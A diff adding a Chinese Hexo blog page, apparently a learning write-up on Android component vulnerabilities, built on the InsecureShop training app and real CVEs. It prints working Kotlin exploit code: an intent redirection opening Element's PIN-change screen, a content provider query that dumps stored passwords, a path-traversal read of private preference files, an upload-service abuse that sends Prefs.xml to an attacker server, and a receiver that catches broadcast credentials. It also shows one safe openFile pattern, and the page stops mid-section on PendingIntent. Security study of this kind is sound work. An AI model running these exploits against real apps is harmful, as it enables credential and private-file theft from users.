@@ -1,0 +1,614 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="保持好奇心" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="保持好奇心" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="保持好奇心" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Mobile" />
+
+
+<link rel="canonical" href="http://example.com/2026/09/11/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E/">
+
+
+
+  <title>
+初识安卓漏洞 - 学习 |
+Y&Yのblog = 保持好奇心</title>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">初识安卓漏洞
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2026-09-11 00:00:00">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2026-09-11T00:00:00+08:00">2026-09-11</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Y&Yのblog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://pic1.imgdb.cn/item/69d5eb8afe07599d0e205da1.jpg"></li>
+          <li class="item" data-background-image="https://pic1.imgdb.cn/item/68ff2d3a3203f7be00a6a25d.png"></li>
+          <li class="item" data-background-image="https://pic1.imgdb.cn/item/69d5eb67fe07599d0e205d5f.jpg"></li>
+          <li class="item" data-background-image="https://pic1.imgdb.cn/item/6a1822c8105bdfb81150a943.jpg"></li>
+          <li class="item" data-background-image="https://pic1.imgdb.cn/item/69d5ec57fe07599d0e205f2c.png"></li>
+          <li class="item" data-background-image="https://pic1.imgdb.cn/item/69d5eb7bfe07599d0e205d81.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="item" rel="index" title="In 学习"><span itemprop="name">学习</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2026/09/11/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="Y&Y">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="保持好奇心">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>让我们基于文章<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpBM016VTFNRFF3T0E9PSZhbXA7bWlkPTIyNDc0ODQyMTAmYW1wO2lkeD0xJmFtcDtzbj1lOTk3N2E5ZGUwYzgxYTUxMTVlMGUwNGM4NDY5NDg1ZiZhbXA7Y2hrc209OWYwYzFjMTVhODdiOTUwM2JkMzcxYTA1MTUxZjIwOWQ3NjgyZWQzMGY3ODY5MGJiNzcyM2FjMWFjMWM0ZGVlNDNiMGU1MWVhYWZlMiZhbXA7c2NlbmU9NTgmYW1wO3N1YnNjZW5lPTAjcmQ="> Android 组件逻辑漏洞漫谈</span>对漏洞简单分类。使用开源项目<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29wdGl2L0luc2VjdXJlU2hvcA=="> InsecureShop</span> 作为示例</p>
+<h2 id="activity"><a class="markdownIt-Anchor" href="#activity">#</a> Activity</h2>
+<p>activity 中一个重要的属性是  <code>android:exported</code> 。表明当前 Activity 是否可以被其他应用启动。</p>
+<h3 id="intent-redirection"><a class="markdownIt-Anchor" href="#intent-redirection">#</a> Intent Redirection</h3>
+<p><code>android:exported</code>  属性为 <code>true</code>  的 Activty 可以接收第三方应用的 Intent。假如将不可信 Intent 进行转发，就有可能造成未导出组件泄露</p>
+<h4 id="cve-2024-26131"><a class="markdownIt-Anchor" href="#cve-2024-26131">#</a> <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2hpZWxkZXIuY29tL2Jsb2cvMjAyNC8wNC9lbGVtZW50LWFuZHJvaWQtY3ZlLTIwMjQtMjYxMzEtY3ZlLTIwMjQtMjYxMzItbmV2ZXItdGFrZS1pbnRlbnRzLWZyb20tc3RyYW5nZXJzLw==">CVE-2024-26131</span></h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (getIntent().hasExtra(EXTRA_NEXT_INTENT)) &#123;</span><br><span class="line">startSyncing();</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">Intrinsics.checkNotNullExpressionValue(intent, <span class="string">&quot;intent&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">33</span>) &#123;</span><br><span class="line">    obj = intent.getParcelableExtra(EXTRA_NEXT_INTENT, Intent.class);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">parcelableExtra</span> <span class="operator">=</span> intent.getParcelableExtra(EXTRA_NEXT_INTENT);</span><br><span class="line">    <span class="keyword">if</span> (parcelableExtra <span class="keyword">instanceof</span> Intent) &#123;</span><br><span class="line">        obj2 = parcelableExtra;</span><br><span class="line">    &#125;</span><br><span class="line">    obj = (Intent) obj2;</span><br><span class="line">&#125;</span><br><span class="line">startIntentAndFinish((Intent) obj);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意到当 Intent 中附带了另一个 Intent 时，应用会调用 <code>startIntentAndFinish</code>  方法启动 Intent 对应的 activity。</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260909130142527.png" alt="image-20260909130142527"></p>
+<p>意味着可以通过这一点去启动其他未导出组件。</p>
+<p>作为隐私对话软件，Element 有自己的应用密码。 <code>PinActivity</code>  是修改密码的页面。只要通过 Intent 重定向直接启动 <code>PinActivity</code> ，攻击者就可以修改为自己的密码并登录。</p>
+<p>接下来编写第三方软件复现。</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> innerIntent = Intent().apply &#123;</span><br><span class="line">    setClassName(<span class="string">&quot;im.vector.app&quot;</span>, <span class="string">&quot;im.vector.app.features.pin.PinActivity&quot;</span>)</span><br><span class="line">    putExtra(<span class="string">&quot;mavericks:arg&quot;</span>, PinArgs(PinMode.MODIFY))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> outerIntent = Intent().apply &#123;</span><br><span class="line">    setClassName(<span class="string">&quot;im.vector.app&quot;</span>, <span class="string">&quot;im.vector.application.features.Alias&quot;</span>)</span><br><span class="line">    putExtra(<span class="string">&quot;EXTRA_NEXT_INTENT&quot;</span>, innerIntent)</span><br><span class="line">&#125;</span><br><span class="line">startActivity(outerIntent)</span><br></pre></td></tr></table></figure>
+<p>注意要把 PinArgs 和 PinMode 复制到自己的应用。</p>
+<p>点击按钮启动逻辑，成功跳转到修改密码页面。</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260909131207645.png" alt="image-20260909131207645"></p>
+<h3 id="其他"><a class="markdownIt-Anchor" href="#其他">#</a> 其他</h3>
+<p>对于点击劫持和 Fragment 注入，我认为目前这种漏洞已经很少见了。所以只做了解</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpVeU56YzRNemszTVE9PSZhbXA7bWlkPTIyNDc0ODc0OTMmYW1wO2lkeD0xJmFtcDtzbj1jNWJlMDcwZjIwNGI5MTk3NDdhMDg2NTE1NmQ3Y2FmOSZhbXA7Y2hrc209ZmE3YjExNDljZDBjOTg1ZmY2OWJiYmZhNDkwMWUwMjZjMWRiMzhjMzIyMTliYTliNzc3ZjhhMGIxNjNiOWI2ZTNlYzliMTgxYmQ4NyZhbXA7Y3VyX2FsYnVtX2lkPTE0MjA4NjE5NDkzNjkzMDMwNDEmYW1wO3NjZW5lPTIxI3dlY2hhdF9yZWRpcmVjdA==">不可忽视的威胁：Android 中的点击劫持攻击</span></p>
+<h2 id="contentprovider"><a class="markdownIt-Anchor" href="#contentprovider">#</a> ContentProvider</h2>
+<p>ContentProvider 除了 exported 属性之外，还有 permission 属性，表示访问所需的权限。</p>
+<p>此外，Provider 还提供了 <code>grantUriPermissions</code> ，表示是否允许临时为客户端授予该 provider 的访问权限</p>
+<h3 id="export"><a class="markdownIt-Anchor" href="#export">#</a> Export</h3>
+<p>ContentProvider 设为 <code>exported = &quot;ture&quot;</code>  导致第三方应用可以访问造成的数据泄露。</p>
+<p>AndroidManifest.xml 文件定义：</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260901183036851.png" alt="image-20260901183036851"></p>
+<p>具体代码</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260901183212077.png" alt="image-20260901183212077"></p>
+<p>查询方法没有验证调用者身份，任何本地应用都可以读取</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> uri = Uri.parse(<span class="string">&quot;content://com.insecureshop.provider/insecure&quot;</span>)</span><br><span class="line"><span class="keyword">val</span> cursor = contentResolver.query(uri,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">cursor?.use &#123;</span><br><span class="line">    <span class="keyword">if</span> (it.moveToFirst()) &#123;</span><br><span class="line">        <span class="keyword">val</span> usernameIndex = it.getColumnIndex(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        <span class="keyword">val</span> passwordIndex = it.getColumnIndex(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (usernameIndex &gt;= <span class="number">0</span> &amp;&amp; passwordIndex &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">val</span> username = it.getString(usernameIndex)</span><br><span class="line">            <span class="keyword">val</span> password = it.getString(passwordIndex)</span><br><span class="line">            Log.d(<span class="string">&quot;attacker&quot;</span>, <span class="string">&quot;Username: <span class="variable">$username</span>, Password: <span class="variable">$password</span>&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; ?: run &#123;</span><br><span class="line">    Log.d(<span class="string">&quot;attacker&quot;</span>, <span class="string">&quot;查询失败&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260901182941460.png" alt="image-20260901182941460"></p>
+<h4 id="cve-2025-21615"><a class="markdownIt-Anchor" href="#cve-2025-21615">#</a> CVE-2025-21615</h4>
+<p>xml 文件中没有写出任何权限</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260901194749586.png" alt="image-20260901194749586"></p>
+<p>同时 <code>GpxProvider</code>  也没有对 uri 进行验证，直接打开了文件</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260902172844629.png" alt="image-20260902172844629"></p>
+<p>利用这个任何第三方应用都可以内部目录下的文件内容</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> targetFile = <span class="string">&quot;/data/data/ch.bailu.aat/shared_prefs/Preferences.xml&quot;</span></span><br><span class="line"><span class="keyword">val</span> uri = Uri.parse(<span class="string">&quot;content://ch.bailu.aat.gpx<span class="variable">$targetFile</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">val</span> pfd = contentResolver.openFileDescriptor(uri, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    pfd?.use &#123;</span><br><span class="line">        <span class="keyword">val</span> inputStream = FileInputStream(it.fileDescriptor)</span><br><span class="line">        <span class="keyword">val</span> reader = BufferedReader(InputStreamReader(inputStream))</span><br><span class="line">        <span class="keyword">val</span> content = reader.readText()</span><br><span class="line">        Log.d(<span class="string">&quot;Attacker&quot;</span>, <span class="string">&quot;成功读取 Preferences.xml 内容：\n<span class="variable">$content</span>&quot;</span>)</span><br><span class="line">    &#125; ?: run &#123;</span><br><span class="line">        Log.e(<span class="string">&quot;Attacker&quot;</span>, <span class="string">&quot;openFileDescriptor 返回 null&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (e: Exception) &#123;</span><br><span class="line">    Log.e(<span class="string">&quot;Attacker&quot;</span>, <span class="string">&quot;读取失败&quot;</span>, e)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260902173419022.png" alt="image-20260902173419022"></p>
+<h3 id="openfile"><a class="markdownIt-Anchor" href="#openfile">#</a> openFile</h3>
+<p>Content Provider 中除了增删查改方法外，如果想实现共享文件读写，那么还可以重写 <code>openFile</code>  方法。</p>
+<p>假如没有对 uri 进行验证，就可能出现路径穿越等问题导致私有目录文件泄露。</p>
+<p>像上面的例子中，就没有对 uri 进行验证。</p>
+<p>有趣的是，在我搜索相关资料的过程中，发现一个来自 2013 年的路径穿越<span class="exturl" data-url="aHR0cDovL3dvb3l1bi4yeHNzLmNjL2J1Z19kZXRhaWwucGhwP3d5YnVnX2lkPXdvb3l1bi0yMDEzLTA0NDQwNw==">漏洞</span>，而直到 2025 年仍然有这种漏洞，看的出来非常经典<sup>_</sup></p>
+<h4 id="esc中的openfile漏洞"><a class="markdownIt-Anchor" href="#esc中的openfile漏洞">#</a> <span class="exturl" data-url="aHR0cHM6Ly93d3cudHJlbmRtaWNyby5jb20vZW5fZ2IvcmVzZWFyY2gvMjAvai9jb250ZW50cHJvdmlkZXItcGF0aC10cmF2ZXJhbC1mbGF3LW9uLWVzYy1hcHAtcmV2ZWFscy1pbmZvLmh0bWw=">ESC 中的 openFile 漏洞</span></h4>
+<p><code>FileContentProvider</code>  导出</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260910155649138.png" alt="image-20260910155649138"></p>
+<p>并且 openFile 中的 uri 仅仅将前缀替换，未作验证。可以任意访问私有目录中的文件</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260910155613783.png" alt="image-20260910155613783"></p>
+<p>正确写法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span> <span class="params">(Uri uri, String mode)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">  <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(DIR, uri.getLastPathSegment());</span><br><span class="line">  <span class="keyword">if</span> (!f.getCanonicalPath().startsWith(DIR)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ParcelFileDescriptor.open(f, ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="service"><a class="markdownIt-Anchor" href="#service">#</a> Service</h2>
+<p>service 启动时会调用 Service.onCreate () 方法。每次 startService 会调用 Service.onStartCommand</p>
+<h3 id="implicit-export"><a class="markdownIt-Anchor" href="#implicit-export">#</a> Implicit Export</h3>
+<p>Service 同样有 <code>android:exported</code>  属性。</p>
+<p>上传服务被设为导出</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260903194107618.png" alt="image-20260903194107618"></p>
+<p>被导出的这个服务可以接收任意 intent</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260903194732932.png" alt="image-20260903194732932"></p>
+<p>直接从 intent 中获取附带的类，不做校验直接执行上传操作。并且应用申请了用户的读写权限</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260903195019454.png" alt="image-20260903195019454"></p>
+<p>也就是说可以读取外部存储中的任意文件。此外应用还获取了 <code>READ_CONTACTS</code> ，可以泄露联系人信息。</p>
+<p>现在尝试利用漏洞，将私有目录下的 <code>Prefs.xml</code>  上传到攻击者服务器（本地起的一个 server）。</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> uploadFile = UploadFile(<span class="string">&quot;/data/data/com.insecureshop/shared_prefs/Prefs.xml&quot;</span>)</span><br><span class="line"><span class="keyword">val</span> params = UploadTaskParameters().apply &#123;</span><br><span class="line">    setId(<span class="string">&quot;attack_001&quot;</span>)</span><br><span class="line">    setServerUrl(<span class="string">&quot;http://172.20.10.4:8080&quot;</span>)</span><br><span class="line">    setMaxRetries(<span class="number">0</span>)</span><br><span class="line">    setAutoDeleteSuccessfullyUploadedFiles(<span class="literal">false</span>)</span><br><span class="line">    addFile(uploadFile)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> intent = Intent().apply &#123;</span><br><span class="line">    component = ComponentName(</span><br><span class="line">        <span class="string">&quot;com.insecureshop&quot;</span>,</span><br><span class="line">        <span class="string">&quot;net.gotev.uploadservice.UploadService&quot;</span></span><br><span class="line">    )</span><br><span class="line">    action = <span class="string">&quot;net.gotev.uploadservice.action.upload&quot;</span></span><br><span class="line">    putExtra(<span class="string">&quot;taskClass&quot;</span>, <span class="string">&quot;net.gotev.uploadservice.BinaryUploadTask&quot;</span>)</span><br><span class="line">    putExtra(<span class="string">&quot;taskParameters&quot;</span>, params)</span><br><span class="line">    putExtra(<span class="string">&quot;httpTaskParameters&quot;</span>, HttpUploadTaskParameters().setMethod(<span class="string">&quot;POST&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line">context.startService(intent)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>上传成功</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260907182704036.png" alt="image-20260907182704036"></p>
+<h3 id="intent重定向"><a class="markdownIt-Anchor" href="#intent重定向">#</a> Intent 重定向</h3>
+<p>嵌套 Intent 之前在 activity 中也出现过，原理相同</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260908152901201.png" alt="image-20260908152901201"></p>
+<p>一个导出的 Service，在获取 Intent 时，如果该 Intent 附加了另一个 Intent，就会导致未导出的 Activity 被启动。比如 PrivateActivity</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260908154003861.png" alt="image-20260908154003861"></p>
+<p>这个 activity 不能导出，内部逻辑为加载任意 url</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260908154057785.png" alt="image-20260908154057785"></p>
+<p>这样就会导致攻击者可以在应用内打开任意网站，实现钓鱼网站攻击等 。</p>
+<h3 id="其他-2"><a class="markdownIt-Anchor" href="#其他-2">#</a> 其他</h3>
+<p>同样，我认为服务劫持这种漏洞已经不常见了，所以不做分析</p>
+<p>AIDL 看不懂</p>
+<h2 id="broadcast-receivers"><a class="markdownIt-Anchor" href="#broadcast-receivers">#</a> Broadcast Receivers</h2>
+<h3 id="implicit-export-2"><a class="markdownIt-Anchor" href="#implicit-export-2">#</a> Implicit Export</h3>
+<p>广播分为动态注册和静态注册。</p>
+<p>静态注册在 <code>AndroidManifest.xml</code>  中进行。示例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadcastReceiver&quot;</span>  <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.INPUT_METHOD_CHANGED&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>动态注册在代码中进行。</p>
+<p><code>AboutUsActivity</code>  中注册了广播。注意到没有使用第三个可选参数 <code>permission</code></p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260908175316080.png" alt="image-20260908175316080"></p>
+<p>广播实现类</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260908175406809.png" alt="image-20260908175406809"></p>
+<p>在未对 uri 做校验的情况下，直接用 WebView 打开 uri。如上面所说，会受到攻击。</p>
+<h3 id="信息泄露"><a class="markdownIt-Anchor" href="#信息泄露">#</a> 信息泄露</h3>
+<p>同一个类中另外还有一个方法</p>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260908175558885.png" alt="image-20260908175558885"></p>
+<p>会将用户密码广播出去。隐式 <code>sendBroadcast</code>  会将广播发给匹配 action 且对外导出的广播接收器。</p>
+<p>注册广播接收器，并重写 onReceive 方法。</p>
+<p>当点击这一页时，应用可以接收到泄露出的信息</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> filter = IntentFilter(<span class="string">&quot;com.insecureshop.action.BROADCAST&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span>(Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.TIRAMISU)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">val</span> credSteal = CredStealReceiver()</span><br><span class="line">       registerReceiver(credSteal,filter,Context.RECEIVER_EXPORTED)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p><img data-src="markdown-img/%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E.assets/image-20260908201107133.png" alt="image-20260908201107133"></p>
+<h2 id="pendingintent"><a class="markdownIt-Anchor" href="#pendingintent">#</a> PendingIntent</h2>
+<p>PendingIntent 可以看作 Intent 的高级版本，实现了一种委托授权发送 Intent 进行组件间通信的机制</p>
+<p>ActivityPendingInten 漏洞</p>
+<p>先来看 getActivity 方法</p>
+<p><img data-src="https://mmbiz.qpic.cn/mmbiz_png/ECThdibSVDxgmoSPAWWFBxmKToV8h1mSUSciamjuwwaHTEiaxbwCb4wYBydmLvpVCiauVqFziaibaq3MsfYuiaKTym2iag/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1#imgIndex=0" alt="图片"></p>
+<p>intent 通常用来启动 activity，flags 参数决定了 PendingIntent 的⾏为。上面说到，Content Provider 有一种特殊的 premission，当 exported 设为 false 时，假如 <code>grantUriPermissions</code>  设为 true，第三方应用仍然可以获得访问权限。</p>
+<p>所以，当 Intent 为隐式时，攻击 app 只需要拿到 PengingIntent 对象，修改 Intent 的一些成员，就可以让这个 Intent 匹配到攻击者 app</p>
